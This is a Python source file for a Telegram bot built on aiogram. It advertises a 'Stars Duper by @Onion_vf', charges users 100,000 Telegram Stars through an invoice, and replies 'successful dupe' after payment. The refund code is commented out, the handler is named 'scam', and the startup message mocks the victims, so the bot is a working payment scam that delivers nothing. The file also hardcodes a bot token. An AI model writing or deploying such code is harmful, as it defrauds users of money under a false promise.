from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LabeledPrice, PreCheckoutQuery
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.bot import DefaultBotProperties

import asyncio

BOT_TOKEN="5002947751:AAFUqfeQ1FmAWOWSezX0OlDkOYx9Et7nXS8/test"

GOODS = {
    "demo": 999
}

bot = Bot(
    BOT_TOKEN,
    default=DefaultBotProperties(parse_mode="HTML")
)
dp = Dispatcher(storage=MemoryStorage())

start_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Счет", callback_data="fast")],
    [InlineKeyboardButton(text="ПОДПИСАТСЯ", url="https://t.me/Onion_vf")]
    ])

@dp.message(Command("start"))
async def start(message: Message):
    await message.answer(
        f"<tg-emoji emoji-id='5404880600127504385'>✅</tg-emoji> Stars Duper by @Onion_vf",
        reply_markup=start_kb)

@dp.callback_query(F.data == "fast")
async def scam(callback: CallbackQuery) -> None:
    await callback.message.answer_invoice(
        title="Stars Duper by @Onion_vf",
        description="Stars Duper by @Onion_vf",
        prices=[
            LabeledPrice(label="Demo", amount=100000),
        ],
        payload="demo",
        currency="XTR",
    )

@dp.pre_checkout_query(F.invoice_payload == "demo")
async def pre_checkout_query(query: PreCheckoutQuery) -> None:
    if GOODS.get(query.invoice_payload) > 0:
        await query.answer(ok=True)
    else:
        await query.answer(ok=False, error_message="INVOICE_PAYLOAD_ERROR")


@dp.message(F.successful_payment)
async def successful_payment(message: Message, bot: Bot) -> None:
#    await bot.refund_star_payment(
#        user_id=message.from_user.id,
#        telegram_payment_charge_id=message.successful_payment.telegram_payment_charge_id,
#    )
    await message.answer(f"<tg-emoji emoji-id='5404619844073029633'>✅</tg-emoji> Успешный дюп!",
        reply_markup=start_kb)

async def main():
        await dp.start_polling(bot)

if __name__ == "__main__":
    print("ООО«Бман нищих»")
    asyncio.run(main())